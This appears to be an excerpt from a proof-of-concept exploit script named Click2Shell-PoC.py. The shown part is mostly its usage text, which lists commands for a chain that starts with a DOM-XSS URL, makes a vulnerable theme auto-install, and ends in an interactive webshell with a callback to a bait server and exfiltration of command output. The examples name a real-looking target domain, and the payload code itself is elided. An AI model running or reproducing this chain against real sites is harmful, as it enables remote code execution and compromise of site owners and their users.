...
def main() -> int:
  ...
  python3 Click2Shell-PoC.py -u https://dex.my.id --scan

  # 2. XSS Proof of Concept ONLY (stage-1 crafted DOM-XSS URL, no RCE)
  python3 Click2Shell-PoC.py -u https://dex.my.id --xss
  #    + live-verify the theme auto-install (no webshell, no stage-2)
  python3 Click2Shell-PoC.py -u https://dex.my.id --xss --exploit-wait 120

  # 3. Full RCE chain (stage-1 XSS + bait + stage-2 -> interactive webshell)
  python3 Click2Shell-PoC.py -u https://dex.my.id --rce
  #    + wait up to 300s for the RCE callback on the bait server
  python3 Click2Shell-PoC.py -u https://dex.my.id --rce --wait 300
  #    + run a command on the target through the webshell and exfil output
  python3 Click2Shell-PoC.py -u https://dex.my.id --rce --wait 300 --cmd "id"

  # 4. Custom vulnerable chain theme (default: mobile-repair-zone)
  python3 Click2Shell-PoC.py -u https://dex.my.id --rce --theme <slug>
  ...
  """
    ...
    ap.add_argument('-u', '--target', required=True,
                    help='target origin, e.g. https://dex.my.id')
